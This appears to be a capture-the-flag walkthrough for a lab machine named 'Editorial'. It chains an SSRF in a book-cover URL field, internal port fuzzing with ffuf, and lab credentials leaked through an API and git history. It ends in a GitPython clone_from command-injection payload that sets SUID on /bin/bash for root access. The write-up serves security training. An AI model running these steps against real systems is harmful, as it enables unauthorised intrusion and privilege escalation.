#box #SSRF #api #credentials #git #git-show #gitPython #RCE #suid #GTFOBins 
1. The Editorial machine has a running service on port 80
2. On the application we notice the possibility, through a form, to upload an image or put an URL to attach a cover to our book
![[attachments/editorial-1.png]]
3. #SSRF By using BurpSuite we notice how this Preview click automatically recall an API that will populate the preview thumbnail on the left. We opt to try check whether we can reference our URL to potentially spot a SSRF, and we succeed receiving a response from the server. This might consent us to enumerate the internal system for ports hidden from the outside.
![[attachments/editorial-3.png]]
![[attachments/editorial-2.png]]
4. At this point, we capture the request through BurpSuite and save it locally to then Fuzz it within FFUF
![[attachments/editorial-4.png]]
![[attachments/editorial-5.png]]
5. We then add the FUZZ word inside the request and we're now ready to fuzz the internal services by changing the port number (here we must change the IP to localhost since we want to enumerate the target)
![[attachments/editorial-6.png]]
```sh
ffuf -w /usr/share/seclists/Fuzzing/5-digits-00000-99999.txt -request-proto http -request test.http -fs 61
```
6. In the end, we'll notice that the only http service running on the machine is port 5000 but, this port, isn't accessible externally so we must enumerate it through the SSRF vulnerability
![[attachments/editorial-7.png]]
7. At this point, the best idea might be to use burpsuite to check the content of port 5000 within this SSRF but since this preview actually responds with another URL as shown below, it might be easier and more beneficial to directly through within the help of the developer console of Firefox
![[attachments/editorial-8.png]]
8. So, we opt for the Developer Console and we discover that the response of port 5000 is the following one:
![[attachments/editorial-9.png]]
>Here we could open each item, but we'll click on `Raw` on the right and obtain a base64 encoded string. ![[attachments/editorial-10.png]] With this we'll decode it on our end to have a beautified json within `jq`

```sh
echo 'eyJtZXNzYWdlcyI6W3sicHJvbW90aW9ucyI6eyJkZXNjcmlwdGlvbiI6IlJldHJpZXZlIGEgbGlzdCBvZiBhbGwgdGhlIHByb21vdGlvbnMgaW4gb3VyIGxpYnJhcnkuIiwiZW5kcG9pbnQiOiIvYXBpL2xhdGVzdC9tZXRhZGF0YS9tZXNzYWdlcy9wcm9tb3MiLCJtZXRob2RzIjoiR0VUIn19LHsiY291cG9ucyI6eyJkZXNjcmlwdGlvbiI6IlJldHJpZXZlIHRoZSBsaXN0IG9mIGNvdXBvbnMgdG8gdXNlIGluIG91ciBsaWJyYXJ5LiIsImVuZHBvaW50IjoiL2FwaS9sYXRlc3QvbWV0YWRhdGEvbWVzc2FnZXMvY291cG9ucyIsIm1ldGhvZHMiOiJHRVQifX0seyJuZXdfYXV0aG9ycyI6eyJkZXNjcmlwdGlvbiI6IlJldHJpZXZlIHRoZSB3ZWxjb21lIG1lc3NhZ2Ugc2VuZGVkIHRvIG91ciBuZXcgYXV0aG9ycy4iLCJlbmRwb2ludCI6Ii9hcGkvbGF0ZXN0L21ldGFkYXRhL21lc3NhZ2VzL2F1dGhvcnMiLCJtZXRob2RzIjoiR0VUIn19LHsicGxhdGZvcm1fdXNlIjp7ImRlc2NyaXB0aW9uIjoiUmV0cmlldmUgZXhhbXBsZXMgb2YgaG93IHRvIHVzZSB0aGUgcGxhdGZvcm0uIiwiZW5kcG9pbnQiOiIvYXBpL2xhdGVzdC9tZXRhZGF0YS9tZXNzYWdlcy9ob3dfdG9fdXNlX3BsYXRmb3JtIiwibWV0aG9kcyI6IkdFVCJ9fV0sInZlcnNpb24iOlt7ImNoYW5nZWxvZyI6eyJkZXNjcmlwdGlvbiI6IlJldHJpZXZlIGEgbGlzdCBvZiBhbGwgdGhlIHZlcnNpb25zIGFuZCB1cGRhdGVzIG9mIHRoZSBhcGkuIiwiZW5kcG9pbnQiOiIvYXBpL2xhdGVzdC9tZXRhZGF0YS9jaGFuZ2Vsb2ciLCJtZXRob2RzIjoiR0VUIn19LHsibGF0ZXN0Ijp7ImRlc2NyaXB0aW9uIjoiUmV0cmlldmUgdGhlIGxhc3QgdmVyc2lvbiBvZiBhcGkuIiwiZW5kcG9pbnQiOiIvYXBpL2xhdGVzdC9tZXRhZGF0YSIsIm1ldGhvZHMiOiJHRVQifX1dfQo=' | base64 -d | jq .
```
![[attachments/editorial-11.png]]
9. This gives us further enumeration to do on those different APIs. After enumerating each one, we discover a leftover credential set on: `http://127.0.0.1:5000/api/latest/metadata/messages/authors` containing the following string and letting us obtain a foothold on the target's SSH `dev:dev080217_devAPI!@`
![[attachments/editorial-12.png]]
![[attachments/editorial-13.png]]
10. Once authenticated in SSH as `dev` we immediately notice the presence of an `apps` folder on our terminal, after getting inside of it we notice it's a `git` repository. We immediately land a `git log` command to check what's the history of this repository and we immediately notice the following commit:
![[attachments/editorial-14.png]]
11. We use `git show b734` to check the diffs of this commit and discover another set of credentials `prod:080217_Producti0n_2023!@`
![[attachments/editorial-15.png]]
12. We authenticate with the `prod` user and start enumerating the sudo privileges we have with that user, discovering we have the privilege to run a very specific script with `python3`:
![[attachments/editorial-16.png]]
13. After some research, we discover that specifically the `clone_from` function from `gitPython` is vulnerable to RCE as mentioned here: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858. The exploit is slightly subtle because it requires each space to be anticipated by a `%` otherwise it won't work. An example of command can be found here: https://github.com/Makkkiiii/GitPython-Exploit-CVE-2022-24439/blob/master/exploit.txt. At this point, we set a a SUID to `/bin/bash` in order to escalate to `root` with the following command:
```sh
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% 4777% /bin/bash'
```
14. The command will likely return an error message, but the RCE will be still achieved and can be proved by checking the `/bin/bash`  binary. At this point, we can escalate to `root` with a GTFOBins `/bin/bash -p`
![[attachments/editorial-17.png]]
